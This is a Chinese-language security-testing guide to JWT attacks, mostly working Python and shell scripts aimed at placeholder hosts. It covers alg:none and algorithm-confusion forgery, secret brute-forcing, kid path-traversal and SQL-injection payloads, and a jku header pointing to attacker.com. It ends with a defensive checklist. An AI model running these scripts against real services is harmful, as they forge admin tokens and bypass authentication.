# JWT 攻击技术

> **合规声明**: 本文档仅供授权安全测试使用。未经授权对目标系统进行测试可能违反法律法规。请在获得明确书面授权后进行任何安全测试活动。

---

## 目录

1. [JWT 结构解析](#1-jwt-结构解析)
2. [攻击类型](#2-攻击类型)
3. [检测流程](#3-检测流程)
4. [工具推荐](#4-工具推荐)
5. [Python 示例代码](#5-python-示例代码)

---

## 1. JWT 结构解析

### JWT 格式

JWT（JSON Web Token）由三个 Base64URL 编码的部分组成，用 `.` 分隔：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6InVzZXIifQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Header（头部）

```json
{
  "alg": "HS256",        // 签名算法：HS256, RS256, ES256, none
  "typ": "JWT",          // Token 类型
  "kid": "key-001",      // 密钥 ID（可选）
  "jku": "https://auth.example.com/keys.jwks",  // JWK Set URL（可选）
  "jwk": { ... },        // 内联 JWK（可选）
  "cty": "JWT"           // 内容类型（可选）
}
```

### Payload（载荷）

```json
{
  "sub": "1234567890",         // 主题（用户 ID）
  "name": "John Doe",          // 自定义声明
  "role": "user",              // 角色
  "iat": 1516239022,           // 签发时间 (Issued At)
  "exp": 1516242622,           // 过期时间 (Expiration)
  "nbf": 1516239022,           // 生效时间 (Not Before)
  "iss": "auth.example.com",   // 签发者 (Issuer)
  "aud": "api.example.com",    // 受众 (Audience)
  "jti": "unique-token-id"     // JWT ID
}
```

### Signature（签名）

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

### Python 解析 JWT

```python
import base64
import json

def decode_jwt(token: str) -> dict:
    """解码 JWT 各段（不验证签名）"""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    decoded = {}
    names = ["header", "payload", "signature"]

    for i, part in enumerate(parts[:2]):
        # 补全 Base64 填充
        padding = 4 - len(part) % 4
        if padding != 4:
            part += "=" * padding
        decoded[names[i]] = json.loads(base64.urlsafe_b64decode(part))

    decoded["signature_raw"] = parts[2]
    return decoded

# 使用
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIifQ.abc..."
decoded = decode_jwt(token)
print(json.dumps(decoded, indent=2))
# {
#   "header": {"alg": "HS256", "typ": "JWT"},
#   "payload": {"sub": "1", "role": "user"},
#   "signature_raw": "abc..."
# }
```

---

## 2. 攻击类型

### 2.1 算法混淆攻击

#### alg: none

最经典的 JWT 漏洞：将算法设置为 `none` 使签名验证被跳过。

```bash
# 原始 Token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxIiwicm9sZSI6InVzZXIifQ.
somesignature

# 修改为 alg: none
# Header: {"alg": "none", "typ": "JWT"} -> Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: {"sub": "1", "role": "admin"} -> Base64: eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0

curl -X GET "https://target.com/admin" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
```

#### alg: None 变体

```bash
# Python 生成所有 alg: none 变体
python3 << 'EOF'
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1", "role": "admin"}

def b64encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

b64_header = b64encode(header)
b64_payload = b64encode(payload)

# 各种格式
tokens = [
    f"{b64_header}.{b64_payload}.",
    f"{b64_header}.{b64_payload}",
    f"{b64_header}.{b64_payload}.",
    f"{b64_header}.{b64_payload}.   ",
    f"{b64_header}.{b64_payload}.null",
    f"{b64_header}.{b64_payload}.undefined",
]
for t in tokens:
    print(t)
EOF
```

#### RS256 → HS256 混淆

当后端使用非对称算法（RS256）时，如果代码错误地使用公钥验证 HMAC 签名（HS256），攻击者可以用公钥作为密钥签发 Token。

```python
import jwt
import requests

# 步骤1：获取服务器公钥（通常在 /.well-known/jwks.json）
resp = requests.get("https://target.com/.well-known/jwks.json")
jwks = resp.json()
print(f"[*] JWKS: {jwks}")

# 步骤2：提取公钥
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# 步骤3：用公钥作为 HS256 密钥签发 Admin Token
forged_payload = {"sub": "1", "role": "admin", "iat": 1516239022, "exp": 9999999999}
forged_token = jwt.encode(forged_payload, public_key, algorithm="HS256")

print(f"[*] Forged token: {forged_token}")

# 步骤4：测试
r = requests.get("https://target.com/admin",
                 headers={"Authorization": f"Bearer {forged_token}"})
print(f"[+] Status: {r.status_code}")
if r.status_code == 200:
    print(f"[!] Vulnerable to algorithm confusion!")
```

#### 自动化探测

```python
import jwt
import requests
import base64
import json

def test_algorithm_confusion(url, original_token, public_key=None):
    """测试算法混淆漏洞"""
    parts = original_token.split(".")
    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

    # 提升权限
    payload["role"] = "admin"

    attacks = []

    # 1. alg: none
    for none_alg in ["none", "None", "NONE", "nOnE"]:
        try:
            t = jwt.encode(payload, "", algorithm=none_alg)
            attacks.append(("none", t))
        except:
            pass

    # 2. RS256 → HS256（如果有公钥）
    if public_key:
        for alg in ["HS256", "HS384", "HS512"]:
            try:
                t = jwt.encode(payload, public_key, algorithm=alg)
                attacks.append((f"{alg}(with_pubkey)", t))
            except:
                pass

    # 测试所有伪造 Token
    headers = {"Authorization": f"Bearer {original_token}"}
    original_r = requests.get(url, headers=headers)
    original_len = len(original_r.text)

    for name, token in attacks:
        headers = {"Authorization": f"Bearer {token}"}
        try:
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200 and len(r.text) == original_len:
                print(f"[+] Algorithm confusion: {name} -> {r.status_code}")
                return token
        except:
            pass
    return None
```

### 2.2 弱密钥爆破

#### 使用 jwt-cracker

```bash
# 安装
git clone https://github.com/lmammino/jwt-cracker
cd jwt-cracker && npm install

# 爆破（使用常用密码字典）
node jwt-cracker.js "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc..." "passwordlist.txt"

# 或使用自带字典
node jwt-cracker.js "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc..." "/usr/share/wordlists/rockyou.txt 100000"
```

#### 使用 john

```bash
# JWT 格式转换
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc..." > jwt_hash.txt

# john 的 JWT 格式（需要 hash 扩展）
# jwt2john.py jwt_hash.txt > jwt_for_john.txt

# 爆破
john --wordlist=/usr/share/wordlists/rockyou.txt jwt_for_john.txt
```

#### 使用 hashcat

```bash
# JWT 模式为 16500
hashcat -m 16500 -a 0 jwt_hash.txt /usr/share/wordlists/rockyou.txt --force
```

#### Python 弱密钥爆破

```python
import jwt
import concurrent.futures

def brute_force_jwt(token: str, wordlist_path: str) -> str:
    """爆破 JWT 密钥"""

    def try_key(key: str) -> str:
        key = key.strip()
        try:
            decoded = jwt.decode(token, key, algorithms=["HS256"])
            print(f"[+] Found key: {key}")
            print(f"    Payload: {decoded}")
            return key
        except:
            return None

    with open(wordlist_path, "r", encoding="latin-1", errors="ignore") as f:
        keys = f.readlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
        results = executor.map(try_key, keys)
        for result in results:
            if result:
                return result
    return None

# 使用
token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc..."
key = brute_force_jwt(token, "/usr/share/wordlists/rockyou.txt")
if key:
    # 伪造 Token
    forged = jwt.encode({"sub": "1", "role": "admin"}, key, algorithm="HS256")
    print(f"[*] Forged admin token: {forged}")
```

### 2.3 密钥泄露定位

#### 常见泄露位置

```bash
# 1. 源码中硬编码
grep -r "secret" --include="*.js" --include="*.py" --include="*.go" --include="*.java" .

# 2. 配置文件
grep -r "JWT_SECRET" --include="*.env" --include="*.yml" --include="*.yaml" --include="*.config.*" .

# 3. 公开仓库
# https://github.com/target/repo 搜索 JWT_SECRET / jwt_secret / secret_key

# 4. 错误信息泄露
curl -X GET "https://target.com/api/user" -v 2>&1 | grep -i "secret\|key\|jwt"

# 5. JS 前端文件
curl "https://target.com/static/js/app.js" | grep -i "jwt\|token\|secret"
```

#### 常见弱密钥列表

```
secret
secret123
jwt_secret
jwt-secret
password
password123
admin
test
test123
123456
key
mykey
privatekey
P@ssw0rd
changeme
supersecret
token
jwt
your-secret-key
```

### 2.4 Kid 注入

`kid`（Key ID）是 JWT Header 中的可选字段，用于指定签名密钥。如果后端从文件系统或数据库获取 Key，可能引发路径遍历或 SQL 注入。

#### 路径遍历注入

```python
import jwt
import requests

# 原始 Header: {"alg": "HS256", "kid": "key-001"}
# 修改为: {"alg": "HS256", "kid": "/dev/null"}

forged_header = {
    "alg": "HS256",
    "kid": "/dev/null"
}
forged_payload = {
    "sub": "1",
    "role": "admin",
    "iat": 1516239022,
    "exp": 9999999999
}

# 如果使用 /dev/null 作为 Key（空内容），签名 = HMAC("", payload)
# 注意：这里需要知道后端如何读取 key
# 方式1：使用空字符串
token = jwt.encode(forged_payload, "", algorithm="HS256",
                   headers={"kid": "/dev/null"})

# 方式2：使用已知文件内容作为 key
token2 = jwt.encode(forged_payload, "/etc/passwd content", algorithm="HS256",
                    headers={"kid": "/etc/passwd"})

# 测试
r = requests.get("https://target.com/admin",
                 headers={"Authorization": f"Bearer {token}"})
print(f"Status: {r.status_code}")
```

#### Kid SQL 注入

```python
# 假设后端查询: SELECT key FROM keys WHERE kid = 'user-input'
# 注入构造

forged_header = {
    "alg": "HS256",
    "kid": "' UNION SELECT 'supersecret' -- "
}
token = jwt.encode(
    {"sub": "1", "role": "admin"},
    "supersecret",
    algorithm="HS256",
    headers=forged_header
)

# 测试
r = requests.get("https://target.com/admin",
                 headers={"Authorization": f"Bearer {token}"})
print(f"Status: {r.status_code}")
```

#### Kid 注入自动检测

```python
def test_kid_injection(base_url: str):
    """自动化 Kid 注入检测"""
    results = []

    # /dev/null 空字节
    attacks = [
        # 路径遍历
        ("/dev/null", ""),
        ("/proc/sys/kernel/random/boot_id", ""),
        ("/etc/passwd", ""),
        ("/etc/hosts", ""),
        ("/proc/self/environ", ""),

        # 空字节截断
        ("key%00.json", "key"),

        # Windows 文件
        ("C:\\Windows\\win.ini", ""),
        ("/windows/win.ini", ""),
    ]

    for kid, key_content in attacks:
        try:
            t = jwt.encode(
                {"sub": "1", "role": "admin"},
                key_content,
                algorithm="HS256",
                headers={"kid": kid}
            )
            # 使用 HS256（返回的算法可能变化）
            r = requests.get(f"{base_url}/admin",
                           headers={"Authorization": f"Bearer {t}"})
            if r.status_code == 200:
                results.append((kid, t, r.status_code))
                print(f"[+] Kid injection: {kid} -> {r.status_code}")
        except:
            pass

    return results
```

### 2.5 Jku 头部篡改

`jku`（JWK Set URL）指定了包含公钥的 JWK 集合 URL。如果服务器不验证此 URL 的合法性，攻击者可指定自己控制的 URL。

```python
import jwt
import requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# 步骤1：生成自己的 RSA 密钥对
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# 步骤2：将公钥托管到可控服务器
# 创建 JWKS JSON 文件并托管在公网可访问的服务器上
jwks = {
    "keys": [{
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "n": public_key.public_numbers().n,
        "e": public_key.public_numbers().e,
        "kid": "attacker-key"
    }]
}

# 假设托管在 http://attacker.com/jwks.json
# 步骤3：使用自己的私钥签名，并设置 jku
forged_header = {
    "alg": "RS256",
    "kid": "attacker-key",
    "jku": "http://attacker.com/jwks.json"
}
forged_payload = {
    "sub": "1",
    "role": "admin",
    "iat": 1516239022,
    "exp": 9999999999
}

# 注意：PyJWT 可能不支持自定义 jku，需手动构造
# 使用 python-jose 或 PyJWT 自定义
from jose import jws
token = jws.sign(forged_payload, private_key, algorithm="RS256",
                 header=forged_header)

# 测试
r = requests.get("https://target.com/admin",
                 headers={"Authorization": f"Bearer {token}"})
print(f"Status: {r.status_code}")
```

### 2.6 过期 Token 重放

```python
import jwt
import time

# 步骤1：获取一个已过期的 Token
expired_token = "eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MTYyMzkwMjJ9.abc..."

# 步骤2：将 exp 设置为未来的时间
# 方式1：解码后修改 exp
parts = expired_token.split(".")
import base64, json
header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
payload["exp"] = int(time.time()) + 86400  # 当前时间 + 24小时

# 方式2：如果知道密钥（或使用弱密钥爆破），重新签发
# 假设已获取密钥
secret = "supersecret"
forged = jwt.encode(
    payload,
    secret,
    algorithm=header.get("alg", "HS256")
)

# 步骤3：测试重放
r = requests.get("https://target.com/api/user",
                 headers={"Authorization": f"Bearer {forged}"})
if r.status_code == 200:
    print("[+] Token replay successful!")

# 验证过期时间是否被检查
exp_check = jwt.decode(forged, options={"require": ["exp"]}, verify=False)
print(f"Token expires: {exp_check['exp']}")
```

---

## 3. 检测流程

### JWT 安全检测清单

```mermaid
flowchart TD
    A[获取 JWT Token] --> B{能否解码?}
    B -->|否| C[检查是否是 JWT 格式]
    B -->|是| D[检查算法]
    D --> E{alg: none?}
    E -->|是| F[高危漏洞]
    E -->|否| G[检查密钥强度]
    G --> H{弱密钥?}
    H -->|是| I[可爆破漏洞]
    H -->|否| J[检查 kid/jku]
    J --> K{kid 可注入?}
    K -->|是| L[高危/中危]
    K -->|否| M[检查过期验证]
    M --> N{exp 可篡改?}
    N -->|是| O[重放漏洞]
    N -->|否| P[检查角色/权限]
    P --> Q{payload 篡改后仍有效?}
    Q -->|是| R[签名验证缺陷]
    Q -->|否| S[基础安全通过]
```

### 系统化检测步骤

```python
#!/usr/bin/env python3
"""
JWT 安全检测脚本
"""

import jwt
import requests
import base64
import json
import concurrent.futures
from typing import Optional, Dict, List

class JWTChecker:
    def __init__(self, token: str, api_url: str):
        self.token = token
        self.api_url = api_url
        self.parts = token.split(".")

        if len(self.parts) != 3:
            raise ValueError("Not a valid JWT")

        self.header = json.loads(
            base64.urlsafe_b64decode(self.parts[0] + "==")
        )
        self.payload = json.loads(
            base64.urlsafe_b64decode(self.parts[1] + "==")
        )

    def check_none_algorithm(self) -> bool:
        """检测 alg:none 漏洞"""
        for none_variant in ["none", "None", "NONE", "nOnE", "NoNe"]:
            try:
                token = jwt.encode(
                    {**self.payload, "role": "admin"},
                    "",
                    algorithm=none_variant
                )
                r = requests.get(self.api_url,
                               headers={"Authorization": f"Bearer {token}"})
                if r.status_code == 200:
                    print(f"[!] ALG:NONE bypass with '{none_variant}'")
                    return True
            except:
                pass
        return False

    def check_weak_secret(self, wordlist: str) -> Optional[str]:
        """检测弱密钥"""
        # 使用上面定义的 brute_force_jwt 函数
        return brute_force_jwt(self.token, wordlist)

    def check_kid_injection(self) -> bool:
        """检测 Kid 注入"""
        payload = {**self.payload, "role": "admin"}
        attacks = [("/dev/null", ""), ("/etc/passwd", ""),
                   ("key%00.json", "test")]

        for kid, secret in attacks:
            try:
                token = jwt.encode(payload, secret, algorithm="HS256",
                                 headers={"kid": kid})
                r = requests.get(self.api_url,
                               headers={"Authorization": f"Bearer {token}"})
                if r.status_code == 200:
                    print(f"[!] KID injection: '{kid}'")
                    return True
            except:
                pass
        return False

    def check_exp_bypass(self) -> bool:
        """检测过期时间绕过"""
        payload = {
            **self.payload,
            "exp": 9999999999,    # 远未来的时间戳
            "iat": 1000000000,
        }
        try:
            # 尝试用空算法
            token = jwt.encode(payload, "", algorithm="none")
            r = requests.get(self.api_url,
                           headers={"Authorization": f"Bearer {token}"})
            if r.status_code == 200:
                print(f"[!] EXP bypass via none algorithm")
                return True
        except:
            pass
        return False

    def run_all(self) -> Dict:
        """执行所有检测"""
        results = {}

        print(f"[*] Header: {json.dumps(self.header)}")
        print(f"[*] Payload: {json.dumps(self.payload)}")
        print(f"[*] Algorithm: {self.header.get('alg', 'unknown')}")
        print()

        results["none_algorithm"] = self.check_none_algorithm()
        results["kid_injection"] = self.check_kid_injection()
        results["exp_bypass"] = self.check_exp_bypass()

        return results


# 使用
if __name__ == "__main__":
    token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc..."
    checker = JWTChecker(token, "https://target.com/api/user")
    results = checker.run_all()
```

---

## 4. 工具推荐

### 命令行工具

| 工具 | 用途 | 安装 |
|------|------|------|
| `jwt_tool` | 全功能 JWT 攻击框架 | `git clone https://github.com/ticarpi/jwt_tool` |
| `jwt-cracker` | 快速爆破 HMAC 密钥 | `npm install jwt-cracker` |
| `john` | 密码爆破（支持 JWT） | `apt install john` |
| `hashcat` | GPU 加速爆破 | `apt install hashcat` |
| `jq` | JSON 处理（解析 JWKS） | `apt install jq` |

### Python 库

```bash
pip install pyjwt          # JWT 编解码
pip install python-jose    # 支持更多算法和 JWK
pip install cryptography   # RSA/EC 密钥处理
```

### jwt_tool 使用

```bash
# 安装
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip install -r requirements.txt

# 基本检查
python jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc...

# 算法混淆攻击
python jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc... -X a

# Payload 篡改
python jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc... -I -pc role -pv admin

# 弱密钥爆破
python jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc... -C -d wordlist.txt

# Kid 注入
python jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc... -X i -I -hc kid -hv /dev/null

# 交互模式（推荐）
python jwt_tool.py -t https://target.com/api/user \
  -rh "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc..." \
  -M at
```

### Burp Suite 插件

- **JWT Editor** — 编辑和重放 JWT 请求
- **JSON Web Tokens** — 自动解码 JWT
- **Autorize** — 检测 JWT 越权

---

## 5. Python 示例代码

### JWT 签发自测工具

```python
#!/usr/bin/env python3
"""
JWT 编解码与攻击测试工具箱
"""

import jwt
import base64
import json
import time
import requests
from typing import Dict, Optional, Any

class JWTUtil:
    """JWT 工具箱"""

    @staticmethod
    def debug(token: str) -> None:
        """详细解码 JWT"""
        parts = token.split(".")
        if len(parts) != 3:
            print("[!] Invalid JWT format")

        for i, (name, part) in enumerate(zip(
            ["Header", "Payload", "Signature"],
            parts
        )):
            print(f"\n=== {name} ===")
            try:
                if i < 2:
                    # Base64URL 解码
                    padding = 4 - len(part) % 4
                    if padding != 4:
                        part_padded = part + "=" * padding
                    else:
                        part_padded = part
                    decoded = base64.urlsafe_b64decode(part_padded)
                    data = json.loads(decoded)
                    print(json.dumps(data, indent=2))
                else:
                    print(f"(raw) {part[:50]}...")
            except Exception as e:
                print(f"(decode error) {e}")
                print(f"(raw) {part}")

    @staticmethod
    def forge(original_token: str, new_payload: Optional[Dict] = None,
              new_role: str = "admin", secret: str = "secret") -> str:
        """基于原始 Token 伪造新 Token"""
        parts = original_token.split(".")
        header = json.loads(base64.urlsafe_b64decode(
            parts[0] + "=="
        ))

        if new_payload:
            payload = new_payload
        else:
            payload = json.loads(base64.urlsafe_b64decode(
                parts[1] + "=="
            ))
            payload["role"] = new_role

        # 尝试不同的签名方式
        token = jwt.encode(payload, secret, algorithm=header.get("alg", "HS256"))
        return token

    @staticmethod
    def test_with_api(token: str, api_url: str) -> None:
        """测试 JWT 是否有效"""
        headers = {"Authorization": f"Bearer {token}"}
        r = requests.get(api_url, headers=headers, timeout=10)
        print(f"[{r.status_code}] {api_url}")
        if r.status_code == 200:
            try:
                print(f"Response: {json.dumps(r.json(), indent=2)[:500]}")
            except:
                print(f"Response: {r.text[:200]}")


# 使用示例
if __name__ == "__main__":
    token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc..."

    # 1. 调试解码
    JWTUtil.debug(token)

    # 2. 伪造 Admin Token
    admin_token = JWTUtil.forge(token, new_role="admin", secret="secret")
    print(f"\nAdmin Token: {admin_token}")

    # 3. 测试
    JWTUtil.test_with_api(admin_token, "https://target.com/admin")
```

### 完整攻击链示例

```python
#!/usr/bin/env python3
"""
JWT 攻击链示例
"""

import jwt
import requests
import json
import base64
from typing import Optional

class JWTAudit:
    def __init__(self, token: str, target_url: str):
        self.original_token = token
        self.target_url = target_url
        self._decode_header_payload()

    def _decode_header_payload(self):
        parts = self.original_token.split(".")
        self.header = json.loads(
            base64.urlsafe_b64decode(parts[0] + "==")
        )
        self.payload = json.loads(
            base64.urlsafe_b64decode(parts[1] + "==")
        )
        print(f"[*] Original header: {self.header}")
        print(f"[*] Original payload: {self.payload}")

    def test(self, token: str, description: str = "") -> bool:
        """发送请求测试 Token"""
        r = requests.get(
            self.target_url,
            headers={"Authorization": f"Bearer {token}"},
            timeout=10
        )
        success = r.status_code == 200
        status = "[!]" if success else "[ ]"
        print(f"{status} {description} -> {r.status_code}")
        if success and len(r.text) < 2000:
            print(f"    {r.text[:200]}")
        return success

    def attack_none(self) -> Optional[str]:
        """攻击：alg:none"""
        for none_alg in ["none", "None", "NONE"]:
            try:
                payload = {**self.payload, "role": "admin"}
                token = jwt.encode(payload, "", algorithm=none_alg)
                if self.test(token, f"alg:{none_alg}"):
                    return token
            except:
                pass
        return None

    def attack_hs256_symmetric(self, secret: str) -> Optional[str]:
        """攻击：用已知对称密钥伪造"""
        payload = {**self.payload, "role": "admin"}
        token = jwt.encode(payload, secret, algorithm="HS256")
        if self.test(token, f"HS256 with secret='{secret}'"):
            return token
        return None

    def run_full_audit(self):
        """完整审计"""
        print("\n=== JWT Audit ===")
        print(f"Target: {self.target_url}")
        print(f"Algorithm: {self.header.get('alg', 'unknown')}")
        print()

        # 1. 测试原始 Token
        self.test(self.original_token, "Original token")

        # 2. alg: none
        self.attack_none()

        # 3. 常见弱密钥
        for secret in ["secret", "password", "admin", "key", "jwt_secret",
                       "123456", "test", "changeme"]:
            self.attack_hs256_symmetric(secret)


if __name__ == "__main__":
    auditor = JWTAudit(
        token="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc...",
        target_url="https://target.com/api/user"
    )
    auditor.run_full_audit()
```

---

## 检查清单

- [ ] Token 使用强签名算法（非 none）
- [ ] Token 验证密钥不存在泄露
- [ ] 证书固定（不依赖不可信 jku）
- [ ] kid 和 jku 使用白名单验证
- [ ] 实现 RSA/ECDSA 算法白名单（不接受 HS256 签名验证）
- [ ] 正确校验 exp、nbf、iat 时间戳
- [ ] 定期轮换签名密钥
- [ ] Token 用于访问控制时检查具体权限而非仅身份

> **提醒**: 所有 JWT 攻击测试需在授权范围内进行。发现密钥泄露应立即停止测试并报告。
